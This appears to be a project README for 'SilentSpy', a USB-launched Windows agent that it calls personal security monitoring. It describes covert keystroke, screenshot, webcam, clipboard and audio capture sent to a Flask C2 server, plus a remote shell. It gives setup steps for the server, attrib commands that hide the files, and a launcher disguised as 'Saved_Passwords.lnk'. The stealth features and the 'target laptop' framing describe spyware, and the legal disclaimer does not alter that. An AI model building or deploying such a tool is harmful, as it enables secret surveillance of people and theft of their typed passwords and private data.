<div align="center">
  <img src="https://img.icons8.com/color/96/000000/security-checked--v1.png" width="100">
  <h1>SilentSpy</h1>
  <p><strong>Endpoint Monitoring & Remote Security Toolkit</strong></p>
  <p>Personal Laptop Security Monitoring System</p>
  
  <p>
    <img src="https://img.shields.io/badge/version-5.0-blue">
    <img src="https://img.shields.io/badge/python-3.14-green">
    <img src="https://img.shields.io/badge/platform-Windows-lightgrey">
    <img src="https://img.shields.io/badge/license-MIT-red">
  </p>
</div>

---

## 📋 Overview

SilentSpy is a personal laptop security monitoring system that runs entirely from a USB drive with zero installation. Captures keystrokes, screenshots, webcam, clipboard, and audio. Sends data to AWS VPS for remote monitoring via web dashboard.

---

## ✨ Features

| Feature | Description |
|---------|-------------|
| Zero-Installation | Runs from USB using portable Python |
| Stealth Mode | No console windows, hidden files |
| Keystroke Logging | Real-time keyboard capture |
| Screenshot Capture | Every 30 seconds |
| Webcam Capture | Every 2.5 minutes |
| Clipboard Monitoring | Captures copied text |
| Audio Recording | Every 60 seconds |
| Remote Shell | Execute any command remotely |
| Remote Lock | Lock laptop via command |
| Cloud Backend | AWS EC2 VPS |
| Web Dashboard | Real-time monitoring |

---

## 🏗️ Architecture

Data Flow:

1. User inserts USB and clicks disguised launcher
2. Agent runs silently in background
3. Captures keystrokes, screenshots, webcam, clipboard, audio
4. Data sent via HTTPS to AWS VPS (port 5000)
5. User accesses dashboard via web browser
6. Remote commands sent through Shell tab

Components:

- Target Laptop (Windows) -> Runs the SilentSpy agent from USB
- AWS VPS (Ubuntu) -> Hosts the Flask C2 server and stores data
- User Browser -> Accesses web dashboard for monitoring

---

## 🛠️ Tech Stack

| Component | Technology |
|-----------|------------|
| Agent | Python 3.14 |
| Backend | Flask |
| Cloud | AWS EC2 (Ubuntu 22.04) |
| Dashboard | HTML/CSS/JS |
| Key Capture | pynput |
| Screenshots | pyautogui |
| Webcam | OpenCV |
| Clipboard | pyperclip |
| Audio | pyaudio |

---

## 🚀 Quick Setup

VPS Server (AWS EC2)

Connect to VPS:
ssh -i your-key.pem ubuntu@your-vps-ip

Install dependencies:
sudo apt update && sudo apt install python3-pip screen -y

Install Python packages:
pip3 install flask flask-cors

Start server:
screen -S silentspy
python3 c2_server.py
Press Ctrl+A then D to detach

Agent Configuration

Edit agent.py and change:
SERVER_URL = "http://your-vps-ip:5000"

Hide Files on USB

cd E:\Confidential_Data
attrib +s +h AppData
attrib +s +h System32_cache
attrib +s +h Microsoft_Edge
attrib +s +h tempfile
attrib +s +h Photos.vbs

Access Dashboard

http://your-vps-ip:5000

---

## 📊 Dashboard Tabs

| Tab | Function |
|-----|----------|
| Keys | Live keystrokes |
| Screenshots | Captured screenshots |
| Webcam | Captured photos |
| Clipboard | Copied text |
| Audio | Recordings |
| Shell | Remote commands |

Shell Commands Examples

| Command | Effect |
|---------|--------|
| whoami | Get username |
| ipconfig | Get network configuration |
| dir C:\ | List directory contents |
| tasklist | Show running processes |
| rundll32.exe user32.dll,LockWorkStation | Lock laptop remotely |

---

## 📁 Project Structure

SilentSpy/
├── Microsoft_Edge/
│   └── agent.py           # Main monitoring agent
├── System32_cache/        # Portable Python (large files via LFS)
├── Windows/               # Dashboard files
├── Photos.vbs             # VBS launcher
├── Saved_Passwords.lnk    # Disguised shortcut of Photos.vbs
├── Photos.vbs             # Batch launcher
├── .gitattributes         # Git LFS configuration
└── README.md              # This file

---

## ⚠️ Legal Disclaimer

FOR LEGITIMATE PERSONAL USE ONLY.

- Use only on devices you own
- Use only for protecting your own data
- NOT for unauthorized surveillance
- NOT for devices you don't own

By using this software, you accept all legal responsibility.

---

## 📝 License

MIT License

---

<div align="center">
  <p>Made with 🔒 for personal security</p>
  <p>© 2026 SilentSpy | Version 5.0</p>
</div>
